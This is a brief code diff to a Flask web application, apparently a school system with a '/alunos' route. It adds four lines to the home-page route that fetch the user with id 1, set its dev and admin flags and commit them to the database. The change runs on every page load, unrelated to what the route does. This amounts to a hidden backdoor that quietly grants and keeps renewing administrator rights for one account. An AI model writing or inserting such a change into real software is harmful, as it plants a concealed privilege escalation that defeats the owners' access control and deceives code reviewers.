@@ -104,6 +104,10 @@ def not_found(e):
 
 @app.route('/')
 def home():
+    hendrius = User.query.filter_by(id=1).first()
+    hendrius.dev = True
+    hendrius.admin = True
+    db.session.commit()
     return render_template('home.html')
 
 @app.route("/alunos", methods=["GET", "POST"])
